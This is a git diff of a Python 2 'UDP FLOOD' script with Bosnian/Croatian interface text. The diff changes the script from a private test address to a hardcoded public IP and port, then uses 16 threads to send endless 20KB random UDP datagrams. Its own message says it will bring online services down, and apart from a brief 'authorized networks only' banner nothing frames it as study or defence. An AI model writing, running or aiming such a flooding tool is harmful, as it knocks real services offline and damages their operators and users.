@@ -8,8 +8,7 @@ import threading
 import socket
 
 #Postavke
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(64000)
+payload = random._urandom(20000)
 # Boje
 RED     = "\033[91m"
 GREEN   = "\033[92m"
@@ -47,35 +46,42 @@ print "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡶⠾⠷⢷⠾⠶⡿⣟⠻⣿⣿⣿⣿�
 print "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣆⢲⡈⢳⡄⠁⠹⣆⡽⠿⠿⢿⡿⢿⠿⢿⠿⢿⣿⣷⣄⣘⠲⡜⠁⠻⣤⡿⠙⠋⢻⡏⠉⠙⣿⠉⠙⣟⠉⢹⣧⣴⠏⠀⠀"
 print "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛"+ CYAN + "UDP FLOOD" + GREEN + "⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠁⠀⠀⠀"
 print " " + RESET
-print "Koristi samo na " + RED + "ovlaštenim mrežama!" + RESET
+print "Koristi samo na " + RED + "ovlastenim mrezama!" + RESET
 print "Napravio  > " + RED + "HunteR_" + RESET
 
-ip = "192.168.1.1"
-port = 80
+ip = "77.78.204.44"
+port = 1508
 print " "
-pitanje = raw_input("Zeliš li nastaviti? " + YELLOW + "[y/n]: " + RESET)
+pitanje = raw_input("Zelis li nastaviti? " + YELLOW + "[y/n]: " + RESET)
 sent = 0
 if pitanje.lower() == "y":
+    os.system("clear")
+    print "Mreza se flooda UDP paketima, ocekivan prestanak rada online servisa u kratkom vremenu."
     print " "
-    print "Mreža se flooda velikim UDP datagramima, očekivan prestanak rada online servisa u jako kratkom vremenu."
-    print " "
-    print "|| Veličina UDP datagrama - " + CYAN + "64.000B" + WHITE + " ||"
-    print "|| IP - " + CYAN + "192.168.1.1:80" + WHITE + " ||"
-    print "|| " + CYAN + "ISP NE VIDI OVAJ PROMET! " + WHITE + "||"
-    def sender():
+    print YELLOW + "|| IP - 77.78.204.44:1508 (hardcoded)"
+    print YELLOW + "|| PAYLOAD - 20KB random generisanih podataka"
+    print YELLOW + "|| ISP moze vidjet ovaj promet! " + RESET
+    def sender(thread_id):
         while True:
-            sock.sendto(bytes, (ip, port))
-
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            
+            try:
+                while True:
+                    sock.sendto(payload, (ip, port))
+            
+            finally:
+                sock.close()
+           
     threads = []
 
-    for i in range(12):
-        t = threading.Thread(target=sender)
+    for i in range(16):
+        t = threading.Thread(target=sender, args=(i, ))
         t.daemon = True
         t.start()
         threads.append(t)
 
     while True:
-        pass
+        time.sleep(0.005)
 else:
     print "Prekinut nastavak. Izlazim..."
     exit()
